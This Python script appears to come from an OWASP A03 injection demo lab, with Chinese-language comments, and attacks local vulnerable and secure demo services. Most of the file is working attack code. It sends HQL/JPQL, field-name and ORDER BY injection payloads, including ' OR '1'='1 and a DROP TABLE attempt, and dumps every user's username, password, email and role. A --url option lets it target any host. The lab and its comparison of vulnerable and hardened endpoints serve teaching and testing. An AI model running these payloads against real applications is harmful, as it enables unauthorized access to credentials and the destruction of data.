#!/usr/bin/env python3
"""
OWASP A03:2021 - ORM/HQL Injection Attack Script
=================================================

ORM 注入攻擊展示：
1. HQL/JPQL Injection
2. JPA Query Injection
3. Field Name Injection

CWE-564: SQL Injection: Hibernate
https://cwe.mitre.org/data/definitions/564.html

Author: OWASP Demo
"""

import requests
import argparse
import json

# ANSI Colors
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
CYAN = '\033[96m'
RESET = '\033[0m'
BOLD = '\033[1m'

VULNERABLE_URL = "http://localhost:8081"
SECURE_URL = "http://localhost:8082"


def print_banner():
    print(f"""
{RED}╔═══════════════════════════════════════════════════════════════════════════╗
║   ██████╗ ██████╗ ███╗   ███╗    ██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗
║  ██╔═══██╗██╔══██╗████╗ ████║    ██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝
║  ██║   ██║██████╔╝██╔████╔██║    ██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ║
║  ██║   ██║██╔══██╗██║╚██╔╝██║    ██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ║
║  ╚██████╔╝██║  ██║██║ ╚═╝ ██║    ██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ║
║   ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝    ╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ║
║                                                                             ║
║  OWASP A03:2021 - ORM/HQL Injection Attack Script                          ║
║  CWE-564: SQL Injection: Hibernate                                          ║
╚═══════════════════════════════════════════════════════════════════════════╝{RESET}
""")


def hql_injection(base_url):
    """HQL/JPQL Injection 攻擊"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}[1] HQL/JPQL Injection - Hibernate 查詢注入{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    
    print(f"\n{YELLOW}目標端點: {base_url}/api/search/users{RESET}")
    print(f"{YELLOW}原始 HQL: FROM User u WHERE u.{{field}} LIKE '%{{query}}%'{RESET}")
    print(f"{YELLOW}攻擊原理: 在 query 參數中注入 HQL 片段{RESET}")
    
    payloads = [
        ("admin' OR '1'='1", "username", "OR 注入 - 繞過條件"),
        ("' OR role='ADMIN", "username", "提取 ADMIN 用戶"),
        ("admin", "username' OR '1'='1' OR '1", "Field 參數注入"),
        ("' OR password LIKE '%", "username", "提取密碼欄位"),
    ]
    
    for query, field, description in payloads:
        print(f"\n{BLUE}[*] {description}{RESET}")
        print(f"    Query: {query}")
        print(f"    Field: {field}")
        
        try:
            response = requests.get(
                f"{base_url}/api/search/users",
                params={"query": query, "field": field},
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                users = data.get("users", [])
                hql = data.get("query", "")
                
                print(f"    執行的 HQL: {hql}")
                
                if users:
                    print(f"{GREEN}    [SUCCESS] ✓ 返回 {len(users)} 個用戶{RESET}")
                    
                    for user in users[:5]:
                        username = user.get("username", "N/A")
                        password = user.get("password", "N/A")
                        role = user.get("role", "N/A")
                        print(f"      - {username} | Password: {password} | Role: {role}")
                    
                    if len(users) > 5:
                        print(f"      ... 還有 {len(users) - 5} 個用戶")
                else:
                    print(f"{YELLOW}    [?] 無結果{RESET}")
            else:
                data = response.json()
                print(f"{RED}    [-] 錯誤: {data.get('error', 'Unknown')}{RESET}")
                print(f"{YELLOW}    Detail: {data.get('detail', '')[:100]}{RESET}")
                
        except Exception as e:
            print(f"{RED}    [ERROR] {str(e)}{RESET}")


def field_injection(base_url):
    """Field Name Injection"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}[2] Field Name Injection - 欄位名稱注入{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    
    print(f"\n{YELLOW}目標端點: {base_url}/api/search/users{RESET}")
    print(f"{YELLOW}攻擊原理: 在 field 參數中注入，改變查詢結構{RESET}")
    
    payloads = [
        ("password", "直接搜尋密碼欄位"),
        ("role", "搜尋角色欄位"),
        ("email' OR '1'='1' OR '1", "注入條件"),
    ]
    
    for field, description in payloads:
        print(f"\n{BLUE}[*] {description}{RESET}")
        print(f"    Field: {field}")
        
        try:
            response = requests.get(
                f"{base_url}/api/search/users",
                params={"query": "admin", "field": field},
                timeout=10
            )
            
            data = response.json()
            
            if response.status_code == 200:
                users = data.get("users", [])
                print(f"{GREEN}    [SUCCESS] ✓ 返回 {len(users)} 個結果{RESET}")
                
                for user in users[:3]:
                    print(f"      {user}")
            else:
                print(f"{YELLOW}    回應: {data.get('error', str(data)[:100])}{RESET}")
                
        except Exception as e:
            print(f"{RED}    [ERROR] {str(e)}{RESET}")


def order_by_injection(base_url):
    """ORDER BY Injection"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}[3] ORDER BY Injection - 排序注入{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    
    print(f"\n{YELLOW}目標端點: {base_url}/api/search/products{RESET}")
    print(f"{YELLOW}攻擊原理: 在 sortBy 參數中注入{RESET}")
    
    payloads = [
        ("name; DROP TABLE products; --", "嘗試刪除表格（通常會失敗）"),
        ("(CASE WHEN (1=1) THEN name ELSE price END)", "Boolean-based injection"),
        ("price DESC, (SELECT 1 FROM users)", "子查詢注入"),
        ("1,2,3,4,5", "欄位列舉"),
    ]
    
    for sortBy, description in payloads:
        print(f"\n{BLUE}[*] {description}{RESET}")
        print(f"    sortBy: {sortBy}")
        
        try:
            response = requests.get(
                f"{base_url}/api/search/products",
                params={"keyword": "test", "sortBy": sortBy, "order": "asc"},
                timeout=10
            )
            
            data = response.json()
            
            if response.status_code == 200:
                sql = data.get("query", "")
                results = data.get("results", [])
                print(f"    SQL: {sql[:100]}...")
                print(f"{GREEN}    [+] 返回 {len(results)} 個結果{RESET}")
            else:
                print(f"{YELLOW}    錯誤: {data.get('error', 'Unknown')}{RESET}")
                # 錯誤訊息可能洩露資訊
                detail = data.get("detail", "")
                if detail:
                    print(f"    Detail: {detail[:150]}")
                
        except Exception as e:
            print(f"{RED}    [ERROR] {str(e)}{RESET}")


def extract_all_users(base_url):
    """提取所有用戶資料"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}[4] 完整用戶資料提取{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    
    print(f"\n{YELLOW}目標: 使用 HQL 注入提取所有用戶的完整資料{RESET}")
    
    # 使用 OR 1=1 提取所有用戶
    payload = "' OR '1'='1"
    
    try:
        response = requests.get(
            f"{base_url}/api/search/users",
            params={"query": payload, "field": "username"},
            timeout=10
        )
        
        if response.status_code == 200:
            data = response.json()
            users = data.get("users", [])
            
            print(f"\n{GREEN}[SUCCESS] ✓ 成功提取 {len(users)} 個用戶資料{RESET}")
            print(f"\n{YELLOW}{'='*60}{RESET}")
            print(f"{YELLOW}| {'Username':<12} | {'Password':<15} | {'Email':<20} | {'Role':<8} |{RESET}")
            print(f"{YELLOW}{'='*60}{RESET}")
            
            for user in users:
                username = str(user.get("username", "N/A"))[:12]
                password = str(user.get("password", "N/A"))[:15]
                email = str(user.get("email", "N/A"))[:20]
                role = str(user.get("role", "N/A"))[:8]
                print(f"| {username:<12} | {password:<15} | {email:<20} | {role:<8} |")
            
            print(f"{YELLOW}{'='*60}{RESET}")
            
            # 統計
            roles = {}
            for user in users:
                role = user.get("role", "UNKNOWN")
                roles[role] = roles.get(role, 0) + 1
            
            print(f"\n{YELLOW}角色統計:{RESET}")
            for role, count in roles.items():
                print(f"  - {role}: {count} 個用戶")
                
        else:
            print(f"{RED}[-] 查詢失敗: {response.json()}{RESET}")
            
    except Exception as e:
        print(f"{RED}[ERROR] {str(e)}{RESET}")


def compare_vulnerability():
    """比較漏洞版本與安全版本"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}比較漏洞版本 vs 安全版本{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    
    test_cases = [
        {
            "name": "HQL 注入繞過",
            "endpoint": "/api/search/users",
            "params": {"query": "' OR '1'='1", "field": "username"},
        },
        {
            "name": "Field 注入",
            "endpoint": "/api/search/users",
            "params": {"query": "admin", "field": "password"},
        },
        {
            "name": "Order By 注入",
            "endpoint": "/api/search/products",
            "params": {"keyword": "test", "sortBy": "price; --"},
        },
    ]
    
    for test in test_cases:
        print(f"\n{YELLOW}測試: {test['name']}{RESET}")
        print(f"端點: {test['endpoint']}")
        print(f"參數: {test['params']}")
        
        for name, url in [("漏洞版本", VULNERABLE_URL), ("安全版本", SECURE_URL)]:
            try:
                response = requests.get(
                    f"{url}{test['endpoint']}",
                    params=test['params'],
                    timeout=10
                )
                
                status = response.status_code
                data = response.json()
                
                if name == "漏洞版本":
                    # 檢查是否成功注入
                    if status == 200:
                        users = data.get("users", data.get("results", []))
                        if users and len(users) > 0:
                            # 檢查是否洩露了敏感資訊
                            if any(u.get("password") for u in users if isinstance(u, dict)):
                                print(f"  {RED}✗ {name}: {status} - 攻擊成功（洩露密碼）{RESET}")
                            else:
                                print(f"  {YELLOW}? {name}: {status} - 返回 {len(users)} 個結果{RESET}")
                        else:
                            print(f"  {YELLOW}? {name}: {status} - 無結果{RESET}")
                    else:
                        print(f"  {GREEN}✓ {name}: {status} - 請求失敗{RESET}")
                else:
                    if status == 400:
                        print(f"  {GREEN}✓ {name}: {status} - 輸入驗證阻擋攻擊{RESET}")
                    elif status == 403:
                        print(f"  {GREEN}✓ {name}: {status} - 功能已禁用{RESET}")
                    elif status == 200:
                        users = data.get("users", [])
                        # 檢查是否還洩露密碼
                        if users and any(u.get("password") for u in users if isinstance(u, dict)):
                            print(f"  {RED}✗ {name}: {status} - 仍洩露密碼{RESET}")
                        else:
                            print(f"  {GREEN}✓ {name}: {status} - 安全（不洩露敏感資訊）{RESET}")
                    else:
                        print(f"  {YELLOW}? {name}: {status}{RESET}")
                    
            except Exception as e:
                print(f"  {RED}✗ {name}: 錯誤 - {str(e)}{RESET}")


def main():
    parser = argparse.ArgumentParser(
        description="ORM/HQL Injection Attack Script for OWASP A03 Demo",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 orm_injection.py --hql              # HQL 查詢注入
  python3 orm_injection.py --field            # Field 名稱注入
  python3 orm_injection.py --orderby          # ORDER BY 注入
  python3 orm_injection.py --extract          # 提取所有用戶
  python3 orm_injection.py --compare          # 比較安全/漏洞版本
  python3 orm_injection.py --all              # 執行所有攻擊
        """
    )
    
    parser.add_argument("--hql", action="store_true", help="HQL/JPQL Injection")
    parser.add_argument("--field", action="store_true", help="Field Name Injection")
    parser.add_argument("--orderby", action="store_true", help="ORDER BY Injection")
    parser.add_argument("--extract", action="store_true", help="提取所有用戶資料")
    parser.add_argument("--compare", action="store_true", help="比較安全/漏洞版本")
    parser.add_argument("--all", action="store_true", help="執行所有攻擊")
    parser.add_argument("--url", default=VULNERABLE_URL, help="目標 URL")
    
    args = parser.parse_args()
    
    print_banner()
    
    if not any([args.hql, args.field, args.orderby, args.extract, args.compare, args.all]):
        parser.print_help()
        return
    
    url = args.url
    
    if args.all:
        hql_injection(url)
        field_injection(url)
        order_by_injection(url)
        extract_all_users(url)
    else:
        if args.hql:
            hql_injection(url)
        if args.field:
            field_injection(url)
        if args.orderby:
            order_by_injection(url)
        if args.extract:
            extract_all_users(url)
    
    if args.compare:
        compare_vulnerability()
    
    print(f"\n{GREEN}[*] ORM/HQL Injection 攻擊展示完成{RESET}")


if __name__ == "__main__":
    main()
